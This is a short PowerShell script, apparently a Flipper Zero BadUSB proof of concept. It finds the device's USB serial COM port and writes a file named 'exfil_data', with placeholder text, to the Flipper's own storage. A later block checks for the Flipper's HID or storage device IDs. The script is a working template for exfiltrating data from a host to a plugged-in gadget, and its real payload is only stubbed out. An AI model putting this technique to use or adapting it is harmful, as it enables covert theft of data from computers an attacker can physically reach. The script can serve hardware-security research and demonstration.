Start-Sleep -Seconds 10
$mydevs = (Get-PnPDevice | Where-Object{$_.PNPClass -in  "WPD","AndroidUsbDeviceClass","Modem","Ports" } | Where-Object{$_.Present -in "True"} | Where-Object{$_.Service -in "usbser"} | Select-Object Name,DeviceID | Sort-Object Name) | Select-String -Pattern 'COM'
$splitcom = $mydevs -split ("COM")
$portnum = $splitcom[1][0]
$port = New-Object System.IO.Ports.SerialPort COM$portnum,115200,None,8,one
$port.open()
$port.Write("storage write /ext/apps_data/exfil_data`r`n")
$port.Write("This is exfiltrated data`r`n")
$port.Write("$([char] 3)")
$port.Close()


If ((Get-PnPDevice).InstanceID | Where-Object { $_ -match 'HID\\VID_046D\&DEV_C529'})){
    Write-Host "FZ HID Detected ... Sleep 10 sec"
    Start-Sleep -Seconds 10
} Elseif ((Get-PnPDevice).InstanceID | Where-Object { $_ -match 'HID\\VID_0483\&DEV_5740'})){
    Write-Host "FZ Storage Detected ... Sleep 10 sec"
    Start-Sleep -Seconds 10
} Else {
    Write-Host "No Flipper ... I'm dying!"
    Break
}